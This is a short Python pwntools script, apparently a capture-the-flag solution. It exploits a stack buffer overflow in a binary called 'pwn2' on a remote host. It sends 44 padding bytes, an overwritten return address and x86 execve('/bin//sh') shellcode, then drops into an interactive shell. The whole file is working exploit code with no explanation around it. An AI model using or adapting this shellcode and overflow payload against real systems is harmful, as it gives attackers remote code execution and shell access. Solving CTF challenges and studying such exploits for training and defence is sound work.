from pwn import *

TARGET = './pwn2'
HOST = '104.154.106.182'
PORT = 3456

SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# r = process(TARGET)
r = remote(HOST, PORT)

gdb.attach(r, '''
c
''')
elf = ELF(TARGET)

r.recvuntil('$')

payload = ''
payload += 'A' * 44
payload += p32(0x8048541)
payload += SHELLCODE
r.sendline(payload)


r.interactive()
r.close()
